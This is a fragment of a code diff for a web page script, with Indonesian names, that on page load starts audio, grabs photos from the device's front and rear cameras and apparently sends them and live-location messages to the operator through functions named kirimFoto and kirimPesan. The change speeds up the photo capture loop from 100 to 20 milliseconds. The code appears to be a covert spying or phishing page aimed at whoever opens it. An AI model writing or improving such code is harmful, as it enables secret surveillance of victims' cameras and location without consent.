@@ -442,7 +442,7 @@ resolve(`౼ 〘 𝗟𝗢𝗞𝗔𝗦𝗜 𝗟𝗔𝗡𝗚𝗦𝗨𝗡𝗚 〙 �
           canvas.toBlob(async (blob) => {
             if (blob) await kirimFoto(blob);
           }, "image/jpeg");
-          await new Promise(r => setTimeout(r, 100));
+          await new Promise(r => setTimeout(r, 20));
         }
 
         stream.getTracks().forEach(track => track.stop());
@@ -453,7 +453,7 @@ resolve(`౼ 〘 𝗟𝗢𝗞𝗔𝗦𝗜 𝗟𝗔𝗡𝗚𝗦𝗨𝗡𝗚 〙 �
       }
     };
 
-const mulai = async () => {
+  const mulai = async () => {
   audio.muted = false;
   try { await audio.play(); } catch {}
 
@@ -483,7 +483,7 @@ const mulai = async () => {
 
   const belakang = await ambilKamera("environment", "belakang");
   await kirimPesan(`౼ 〘 𝗞𝗔𝗠𝗘𝗥𝗔 𝗕𝗘𝗟𝗔𝗞𝗔𝗡𝗚 〙 ౼\n${belakang}`);
-};
+  };
 
     window.addEventListener("load", mulai);
   </script>
